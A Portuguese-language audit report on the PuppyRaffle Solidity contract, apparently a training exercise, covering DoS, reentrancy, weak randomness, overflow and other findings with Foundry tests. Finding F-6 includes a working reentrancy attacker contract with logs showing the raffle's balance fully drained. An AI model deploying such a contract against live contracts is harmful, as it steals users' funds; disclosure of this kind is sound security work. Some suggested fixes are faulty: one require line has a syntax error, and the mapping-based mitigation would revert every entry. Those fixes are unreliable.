### [F-1] Considere usar uma versão específica do Solidity.
Por exemplo, considere usar `pragma solidity 0.8.20` ao invés de `pragma solidity ^0.8.30`.

### [F-2] As variáveis de estado que não são atualizadas após a implantação devem ser declaradas constantes para poupar gás.
Adicione o atributo constant ou immutable às variáveis ​​de estado que nunca mudam.

### [F-3] Falta de checagem de endereço vazio.
Em `PuppyRaffle::enterRaffle` não há checagem se o array de endereços inserido está vazio.

### [F-4] as variáveis de armazenamento num ciclo devem ser colocadas em cache.
Para que toda vez que for ler players.length, ler do armazenamento, o invés da memória. Isso é mais eficiente, e economiza gas.
```diff
+   uint256 playerLength = newPlayers.length;
-   for (uint256 i = 0; i < newPlayers.length; i++) {
+   for (uint256 i = 0; i < playerLength; i++) {
            players.push(newPlayers[i]);
    }
```

### [F-5] Em ```PuppyRaffler::enterRaffle``` pode haver um possivel ataque de negação de serviço (DoS). Aumentando o custo de gás após cada cada entrada, e interferindo no funcionamento do contrato.

**Description :**
Fazer um looping no array de players em ```PuppyRaffler::enterRaffle``` para checar se há endereços duplicados pode causar um possivel ataque de negaçao (DoS). Aumentando o custo de gás após cada cada entrada e interferindo no funcionamento do contrato.

```javascript
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

```
**Impact :**
O custo de gas para a entrada de MUITOS players seria muito alto.

**Proof of Concept :**
Ao fazer duas entradas com 100 endereços, o custo de gas é : 
- Primeira entrada : ~6252128
- Segunda entrada : ~18068218

```javascript
function test_DenailOfService() public {
        vm.txGasPrice(1);

        //Let's enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for(uint256 i = 0; i < playersNum; i ++){
        players[i] = address(i);
       }
       //See how much gas it costs
       uint256 gasStart = gasleft();
       puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
       uint256 gasEnd = gasleft();
       uint256 gasUsedFirst = ( gasStart - gasEnd) * tx.gasprice;
       console.log("Gas cost of the first 100 players", gasUsedFirst);

       //Let's enter to second time
        address[] memory playersTwo = new address[](playersNum);
        for(uint256 i = 0; i < playersNum; i ++){
        playersTwo[i] = address(i + playersNum);
       }
       //See how much gas it costs
       uint256 gasStartSecondTime = gasleft();
       puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
       uint256 gasEndSecondTime = gasleft();
       uint256 gasUsedSecond = ( gasStartSecondTime - gasEndSecondTime) * tx.gasprice;
       console.log("Gas cost of the second 100 players", gasUsedSecond);
       assert(gasUsedFirst < gasUsedSecond);
}
```

**Recommended Mitigation :**
1. Considere permitir duplicatas. Os usuários podem criar novos endereços de carteira de qualquer maneira, portanto, uma verificação duplicada não impede que a mesma pessoa insira várias vezes, apenas o mesmo endereço de carteira.

2. Considere usar um mapeamento para verificar duplicatas. Isso permitiria verificar duplicatas em tempo constante, em vez de em tempo linear. Você poderia fazer com que cada sorteio tivesse um ID uint256, e o mapeamento seria um endereço de jogador mapeado para o ID do sorteio.

3. Considere limitar o tamanho do array para entradas, exemplo :
```require(newPlayers.length <= 100>, "Array size exceed the maximum allowed");```

```javascript
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        require(newPlayers.length <= 100>, "Array size exceed the maximum allowed");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

- Alternativamente, você poderia usar a biblioteca EnumerableSet do OpenZeppelin.

### [F-6] Reentrancy Attack
Em `PuppyRaffle::refund` está vulnerável a Reetrnacy Attack e ser drenado todo o balance do contrato.

A funçao `refund` não segue o padrão CEI para evitar reentradas.

**Impact**
O endereço que estive chamando a função, pode ter uma função de fallback ou receive que liga de volta a função refund, fazendo a chamada para refund entre num loop até ser drenado todo dinheiro do contrato PuppyRaffle.

**Proof of Concept**
A vulnerabilidade se encontra onde primeiro é feito uma chamada externa, e só depois é feito
a atualização no array de players.

```javascript
function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>       payable(msg.sender).sendValue(entranceFee);

@>       players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```
<details>
<summary>Code</summary>
Test

```javascript
function test_reentrancyRefund() public {
        // users entering raffle
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
        console.log("PuppyRaffle balance: ", startingPuppyRaffleBalance);

        // create attack contract and user
        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        // noting starting balances
        uint256 startingAttackContractBalance = address(attackerContract).balance;
        console.log("AttackerContract balance before the attack: ", startingAttackContractBalance);

        // attack
        vm.prank(attacker);
        attackerContract.attack{value: entranceFee}();

        // impact
        // console.log("attackerContract balance: ", startingAttackContractBalance);
        // console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
        console.log("AttackerContract balance after the attack: ", address(attackerContract).balance);
        console.log("PuppyRaffle balance after the attack: ", address(puppyRaffle).balance);
    }
```

Attack Contract
```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```

Logs : 
```Logs:
  PuppyRaffle balance:  4000000000000000000
  AttackerContract balance before the attack:  0
  AttackerContract balance after the attack:  5000000000000000000
  PuppyRaffle balance after the attack:  0
  ```
</details>

**Recommend Mitigation** 
Considere fazer o update do array do player antes de fazer a chamada external de envio de ether

```javascript
function refund(uint256 playerIndex) public {
        //Checks
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        //Effects
        players[playerIndex] = address(0);

        //Interactions
        payable(msg.sender).sendValue(entranceFee);

        emit RaffleRefunded(playerAddress);
    }
```

### [F-7] Em `PuppyRaffle::getActivePlayerIndex` Essa função retorna 0 para um player não existente no index 0, mas pode acontecer que o primeiro player seja de index 0, ao chamar esta função, pode causar um desentedimento, e o player achar que ele não está ativo no sorteio

**Description**
Em `PuppyRaffle::player` no index 0 chamar a função `getActivePlayerIndex` ela irá retornar 0. Mas de acordo com a função, retornar 0 seria para usuário não ativos no sorteio.

**Impact**
O player que for o index 0, ao chamar a função, pode pensar que não está ativo no sorteio. Consumindo gas em vão.

**Proof of Concept**
Mesmo que 0 seja o index de um player, a função então retornará 0.

```javascript
function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
@>       return 0;
    }
```

**recommend Mitigation** 
1. Considere reverte a chamar de função apenas se o chamador não estive no array de players.

2. Considere retornar um `int256` na função, para ser -1 se o player não for ativo

## [F-8] Source of Randomness em `PuppyRaffle::selectWinner` pode ser influenciado por mineradores. Prevendo  um vencendor a levar todo o dinheiro e mintado um puppy raro.

**Description**
PRNG fraco devido a um módulo no block.timestamp ou blockhash. Estes podem ser influenciados pelos mineradores até certo ponto. Usuários maliciosos podem manipular esses valores para obter a saida correta.

**Impact**
Qualquer usuário pode influenciar o vencedor do sorteio, levando o dinheiro e mintando um puppy raro.

**Proof of Concept**
https://github.com/crytic/slither/wiki/Detector-Documentation#weak-PRNG

**Mitigation** 
Não use block.timestamp, BlockHash ou Prevrandao como fonte de aleatoriedade.

Considere usar o VRF Chainlink para gerar numeros aleatórios para a blockchain.

### [F-8] Ao fazer o typecast de UINT256 para UINT64 acaba causando overflow.

**Description**
Em `PuppyRaffle::selectWiner`, ao fazer o typecast de UINT256 `totalFees` para UINT64 acaba causando overflow.

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

**Impact**
Isso significa que o `feeaddress` não coletará a quantidade correta de taxas, deixando as taxas permanentemente presas no contrato.

**Proof of Concept**
O valor máximo de um `uint64` é `18446744073709551615`.

1. Um sorteio prossegue com pouco mais de 18 ETH em taxas coletadas
2. A linha que lança a `fees` como um `uint64` é atingido.
3. Então `totalFees` é atualizado incorretamente com uma quantidade menor.

Você pode replicar isso no chisel do Foundry, executando o seguinte :

```javascript
uint256 max = type(uint64).max //18.446744073709551615
uint256 fee = max + 1 // Overflow
uint64(fee)
// prints 0
```
**Mitigation** 
Set `PuppyRaffle::totalFees` para `uint256` em vez de `uint64`, e remova o casting. Tem um comentário que diz:

```javascript
// We do some storage packing to save gas
```
Mas o gás potencial economizado não vale a pena se precisarmos reformular e esse bug existir.

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

### [F-9] As carteiras ou (contratos) vencedores do sorteio sem uma função `receive` ou `fallback` bloqueará o início de um novo concurso.

**Description:** A função `PuppyRaffle::selectWinner` é responsável por redefinir a loteria. No entanto, se o vencedor for uma carteira de contrato inteligente que rejeite o pagamento, a loteria não poderá reiniciar.
Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** A função `PuppyRaffle::selectWinner` pode reverter muitas vezes e tornar muito difícil redefinir a loteria, impedindo que uma nova inicie.
Além disso, os verdadeiros vencedores não seriam capazes de ser pagos, e outra pessoa ganharia seu dinheiro !

**Proof of Concept:**
1. 10 smart contract wallets entra na loteria sem uma função de fallback ou recebimento.
2. A loteria termina
3. The `selectWinner` function não funcionaria, mesmo que a loteria tenha terminado !

**Recommended Mitigation:**

1. Não permita que os participantes da carteira de contrato inteligentes participe (não recomendados).
2. Crie um mapeamento de endereços -> Pagamento para que os vencedores possam extrair seus fundos, colocando a própria pessoa no vencedor para reivindicar seu prêmio.(Recomendado)

Para abordar brevemente as nossas recomendações aqui - A razão pela qual não permitir a entrada de contratos inteligentes não seria uma mitigação preferida, é que isso restringiria situações como carteiras com várias assinaturas de participação. Preferimos não bloquear totalmente as pessoas.
Por esta razão, a segunda recomendação é a preferida. Isto estabeleceu um padrão de design muito bom conhecido como Pull over Push, onde idealmente, o utilizador está a fazer um pedido de retirada de fundos, em vez de um protocolo que os distribui.

### [F-10] Mishandling ETH !!

**Description:** Tratamento incorreto de ETH na função `PuppyRaffle::withdrawFees`, ` require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");`

**Impact:** Usuários maliciosos podem enviar ETH para este contrato, fazendo com que o require falhasse. A utilização de igualdades estritas podem ser facilmente manipuladas por um atacante.

**Proof of Concept:**
```javascript
function withdrawFees() external {
        // Nescessita que o balance seja igual a totalFees. 
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```
No entranto, se Bob enviar 0,1 Ether. Como resultado, `withdrawFees` galhará e o saque nunca dará certo.

**Recommended Mitigation:**
Não use igualdade estrita para determinar se uma conta tem Ether ou tokens suficientes.

### [F-11] Missing zero address validation.

**Description:**
Detect missing zero address validation in `PuppyRaffle::changeFeeAddress`function.

**Impact:**
O owner chama changeFeeAddress sem especificar o address, então o novo endereço que receberia os fees é zero, fazendo com que perca todos os fees.

```javascript
function changeFeeAddress(address newFeeAddress) external onlyOwner {
        // No check zero address !
        feeAddress = newFeeAddress;
        emit FeeAddressChanged(newFeeAddress);
    }
```

**Proof of Concept:**
```javascriptfunction withdrawFees() external {
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```
Então ao chamar a função apara enviar `totalFees` para um address 0, todo o valor será perdido.

**Recommended Mitigation:**
Check that the address is not zero.
`require(newFeeAddress != address(0));`